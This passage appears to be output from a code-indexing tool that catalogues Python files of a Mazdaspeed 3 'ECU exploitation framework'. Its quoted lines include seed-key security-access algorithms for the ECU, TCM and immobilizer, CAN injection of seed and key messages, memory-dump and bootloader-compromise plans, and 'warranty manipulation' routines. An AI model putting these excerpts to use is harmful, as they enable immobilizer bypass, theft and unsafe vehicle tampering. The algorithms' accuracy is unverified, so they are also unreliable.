learning'},"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader': {'address': 0xFF0000, 'size': 0x1000, 'description': 'Boot sector - reprogramming'},"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "protocol", "line": 262, "protocol": "CAN", "content": "self.can_injection = CANInjection()"}, {"type": "protocol", "line": 265, "protocol": "J2534", "content": "\"\"\"J2534 PROTOCOL VULNERABILITIES\"\"\""}, {"type": "protocol", "line": 270, "protocol": "CAN", "content": "'exploit': 'CAN ID spoofing + sequence number prediction'"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "'exploit': 'Exploit 0x23 0x2A 0x3D services'"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "'target': '0x27 security service',"}, {"type": "protocol", "line": 312, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY PAYLOAD\"\"\""}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID"}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "class CANInjection:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "protocol", "line": 331, "protocol": "CAN", "content": "\"\"\"MAZDASPEED 3 SPECIFIC CAN IDENTIFIERS\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu': 0x7E0,"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag': 0x7E3,"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x10)  # Service"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "FULL SECURITY BYPASS & AUTONOMOUS TUNING FOR STOCK 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "class MazdaECUExploit:"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"COMPLETE MAZDASPEED 3 ECU EXPLOITATION FRAMEWORK\"\"\""}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "self.security_level = \"FACTORY_DEALER_ACCESS\""}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "self.ecu_memory_map = self.map_ecu_memory()"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'ecu_access_27': {"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "hardware", "line": 33, "hardware": "TCM", "content": "'tcm_access_27': {"}, {"type": "hardware", "line": 35, "hardware": "TCM", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 40, "hardware": "immobilizer", "content": "'immobilizer_27': {"}, {"type": "hardware", "line": 41, "hardware": "immobilizer", "content": "'description': 'Immobilizer system access',"}, {"type": "hardware", "line": 42, "hardware": "immobilizer", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "hardware", "line": 64, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 65, "hardware": "TCM", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 77, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "hardware", "line": 92, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "vin = self._read_vin()  # Read VIN from ECU"}, {"type": "hardware", "line": 98, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "def map_ecu_memory(self):"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "\"\"\"COMPLETE MEMORY MAP OF MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 117, "hardware": "TCM", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "'security_areas': {"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "hardware", "line": 273, "hardware": "ECU", "content": "'method': 'Dump entire ECU memory via extended diagnostics',"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "'target': 'ECU flash memory',"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "'security_bypass': {"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "'method': 'Bypass security access without valid key',"}, {"type": "hardware", "line": 279, "hardware": "ECU", "content": "'target': '0x27 security service',"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "'method': 'Compromise ECU bootloader for permanent access',"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "'target': 'Boot sector of ECU',"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "def execute_memory_dump(self):"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE ECU MEMORY VIA DIAGNOSTIC EXPLOIT\"\"\""}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "for area_name, area_info in MazdaECUExploit().ecu_memory_map.items():"}, {"type": "hardware", "line": 324, "hardware": "CAN bus", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "self.ecu_ids = self.enumerate_ecu_ids()"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "def enumerate_ecu_ids(self):"}, {"type": "hardware", "line": 333, "hardware": "ECU", "content": "'engine_ecu': 0x7E0,"}, {"type": "hardware", "line": 334, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 335, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 338, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "def inject_diagnostic_session(self, target_ecu, session_type):"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "return f\"Started {session_type} session on {target_ecu}\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "def security_access_attack(self, target_ecu):"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "\"\"\"AUTOMATED SECURITY ACCESS ATTACK\"\"\""}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "return f\"Security access granted to {target_ecu}\""}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "return \"Security access failed\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "print(\"MAZDASPEED 3 COMPLETE SECURITY & TUNING EXPLOITATION\")"}, {"type": "hardware", "line": 394, "hardware": "ECU", "content": "ecu_exploit = MazdaECUExploit()"}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "print(\"\\n1. ECU SECURITY ACCESS BYPASS\")"}, {"type": "hardware", "line": 403, "hardware": "ECU", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "print(\"\\n2. ECU MEMORY MAP EXPLOITATION\")"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "for area_name, area in ecu_exploit.ecu_memory_map.items():"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "dump_payloads = diagnostic_exploits.execute_memory_dump()"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 19, "pattern": "key", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "seed", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "algorithm", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 23, "pattern": "seed", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "seed", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "'algorithm': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "'seed_bytes': 4,"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "'key_bytes': 4,"}, {"type": "security_pattern", "line": 35, "pattern": "algorithm", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "'seed_bytes': 2,"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "'key_bytes': 2,"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "'seed_bytes': 8,"}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "'key_bytes': 8,"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'vulnerability': 'DES with weak key derivation'"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 62, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 64, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 65, "pattern": "algorithm", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "security_pattern", "line": 66, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "vin_key = self._derive_vin_key()"}, {"type": "security_pattern", "line": 81, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 84, "pattern": "key", "content": "des_key = vin_key[:8]  # Use first 8 bytes of derived key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 86, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 86, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "def _derive_vin_key(self):"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 97, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 98, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 148, "pattern": "algorithm", "content": "\"\"\"REAL-TUNE AI TUNING ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 278, "pattern": "key", "content": "'method': 'Bypass security access without valid key',"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "def security_access_attack(self, target_ecu):"}, {"type": "security_pattern", "line": 360, "pattern": "seed", "content": "seed_msg = can.Message("}, {"type": "security_pattern", "line": 362, "pattern": "seed", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "security_pattern", "line": 365, "pattern": "seed", "content": "self.bus.send(seed_msg)"}, {"type": "security_pattern", "line": 371, "pattern": "seed", "content": "seed_response = self._receive_seed()"}, {"type": "security_pattern", "line": 372, "pattern": "seed", "content": "if seed_response:"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "seed", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "algorithm", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 377, "pattern": "key", "content": "key_msg = can.Message("}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}, {"type": "security_pattern", "line": 382, "pattern": "key", "content": "self.bus.send(key_msg)"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 403, "pattern": "key", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "seed", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "algorithm", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 404, "pattern": "key", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts14.py", "lines_read": 503, "features_found": [{"type": "function", "name": "export_restricted_knowledge", "line": 400}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "_get_race_calibrations", "line": 23}, {"type": "function", "name": "_track_specific_tunes", "line": 68}, {"type": "function", "name": "_mazda_rnd_secrets", "line": 91}, {"type": "function", "name": "__init__", "line": 117}, {"type": "function", "name": "_dealer_tool_access", "line": 122}, {"type": "function", "name": "_warranty_manipulation", "line": 149}, {"type": "function", "name": "_restricted_service", "line": 172}, {"type": "function", "name": "__init__", "line": 198}, {"type": "function", "name": "_hidden_ecu_parameters", "line": 203}, {"type": "function", "name": "_performance_enhancements", "line": 226}, {"type": "function", "name": "_diagnostic_workarounds", "line": 249}, {"type": "function", "name": "__init__", "line": 275}, {"type": "function", "name": "generate_race_tune", "line": 280}, {"type": "function", "name": "_calculate_race_timing", "line": 294}, {"type": "function", "name": "_calculate_race_fueling", "line": 320}, {"type": "function", "name": "_calculate_race_boost", "line": 338}, {"type": "function", "name": "_calculate_race_vvt", "line": 354}, {"type": "function", "name": "_calculate_race_safety", "line": 370}, {"type": "function", "name": "_enable_race_features", "line": 389}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaRaceEngineering", "line": 15}, {"type": "class", "name": "MazdaDealershipSecrets", "line": 114}, {"type": "class", "name": "AdvancedTuningSecrets", "line": 195}, {"type": "class", "name": "MazdaSpeed3RaceTuning", "line": 272}], "algorithms": [{"type": "algorithm_function", "line": 294, "content": "def _calculate_race_timing(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 320, "content": "def _calculate_race_fueling(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 338, "content": "def _calculate_race_boost(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 354, "content": "def _calculate_race_vvt(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 370, "content": "def _calculate_race_safety(self, track_type: str, power_level: str):"}], "protocols": [{"type": "protocol", "line": 160, "protocol": "J2534", "content": "'tool': 'Advanced J2534 tool with custom software',"}], "hardware_assumptions": [{"type": "hardware", "line": 127, "hardware": "ECU", "content": "'security_level': 'FACTORY ENGINEERING',"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "'ECU programming without VIN checks',"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "'security_reset': 'SEC-RES-MAZDA-2024'"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "'tool_required': 'M-MDS with security access',"}, {"type": "hardware", "line": 190, "hardware": "TCM", "content": "'tcm_relearn_drive_cycle': 'Specific 15-minute procedure',"}, {"type": "hardware", "line": 199, "hardware": "ECU", "content": "self.hidden_parameters = self._hidden_ecu_parameters()"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "def _hidden_ecu_parameters(self):"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "'fuel_trim_learning_rate': 'How quickly ECU adapts to changes',"}, {"type": "hardware", "line": 222, "hardware": "TCM", "content": "'transmission_shift_adaptation': 'How TCM learns driving style'"}, {"type": "hardware", "line": 268, "hardware": "TCM", "content": "'transmission_adaptation_reset': 'Clear all TCM learning'"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "print(f\"Security Level: {tools['manufacturer_mode']['security_level']}\")"}, {"type": "hardware", "line": 448, "hardware": "ECU", "content": "print(\"\\n3. HIDDEN ECU PARAMETERS\")"}, {"type": "hardware", "line": 482, "hardware": "ECU", "content": "4. Race calibrations exist within factory ECU programming"}, {"type": "hardware", "line": 491, "hardware": "ECU", "content": "1. Launch control and flat-shift can be activated in stock ECU"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 468, "pattern": "key", "content": "for key, value in values.items():"}, {"type": "security_pattern", "line": 469, "pattern": "key", "content": "print(f\"  {key}: {value}\")"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "KEY RACE TUNING DISCOVERIES:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts15.py", "lines_read": 607, "features_found": [{"type": "function", "name": "main", "line": 540}, {"type": "function", "name": "read_instruction", "line": 31}, {"type": "function", "name": "calculate_ecu_seed_key", "line": 105}, {"type": "function", "name": "calculate_tcm_seed_key", "line": 132}, {"type": "function", "name": "get_race_ignition_maps", "line": 160}, {"type": "function", "name": "get_race_fuel_maps", "line": 204}, {"type": "function", "name": "get_race_boost_maps", "line": 243}, {"type": "function", "name": "execute_manufacturer_mode", "line": 299}, {"type": "function", "name": "get_hidden_menus", "line": 312}, {"type": "function", "name": "warranty_manipulation_procedures", "line": 325}, {"type": "function", "name": "turbo_replacement_procedure", "line": 363}, {"type": "function", "name": "high_pressure_fuel_system_service", "line": 382}, {"type": "function", "name": "transmission_adaptation_reset", "line": 408}, {"type": "function", "name": "__init__", "line": 427}, {"type": "function", "name": "generate_complete_tune", "line": 433}, {"type": "function", "name": "_generate_vvt_maps", "line": 463}, {"type": "function", "name": "_generate_safety_limits", "line": 483}, {"type": "function", "name": "_apply_modification_adjustments", "line": 504}, {"type": "function", "name": "_deep_update", "line": 520}, {"type": "function", "name": "_get_timestamp", "line": 529}, {"type": "function", "name": "_generate_checksum", "line": 534}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "TuningMode", "line": 15}, {"type": "class", "name": "ECUMemoryAddress", "line": 23}, {"type": "class", "name": "MazdaSeedKeyAlgorithm", "line": 98}, {"type": "class", "name": "MazdaRaceCalibrations", "line": 153}, {"type": "class", "name": "DealerToolAccess", "line": 283}, {"type": "class", "name": "AdvancedDiagnosticProcedures", "line": 356}, {"type": "class", "name": "MazdaSpeed3TuningSoftware", "line": 421}], "algorithms": [{"type": "algorithm_function", "line": 105, "content": "def calculate_ecu_seed_key(seed: str) -> str:"}, {"type": "algorithm_function", "line": 132, "content": "def calculate_tcm_seed_key(seed: str) -> str:"}], "protocols": [{"type": "protocol", "line": 32, "protocol": "OBD", "content": "\"\"\"GENERATE OBD2 READ INSTRUCTION FOR THIS ADDRESS\"\"\""}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "return f\"0x23 {self.address:06X} {self.size:04X}\""}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Base Ignition Timing\", 0xFFA000, 256,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Ignition Advance\", 0xFFA100, 256,"}, {"type": "protocol", "line": 49, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Base Fuel Map\", 0xFFA800, 256,"}, {"type": "protocol", "line": 53, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Fuel Compensation\", 0xFFA900, 256,"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Boost Target Map\", 0xFFB000, 128,"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Wastegate Duty Cycle\", 0xFFB080, 128,"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Intake VVT Map\", 0xFFB400, 128,"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Exhaust VVT Map\", 0xFFB480, 128,"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Rev Limiters\", 0xFFB800, 16,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Boost Limits\", 0xFFB810, 16,"}, {"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Knock Learning\", 0xFFC000, 512,"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "\"Fuel Trim Learning\", 0xFFC200, 512,"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "Calculate security key for ECU access (Service 0x27)"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed_bytes[i] ^ 0x73"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 127, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 146, "protocol": 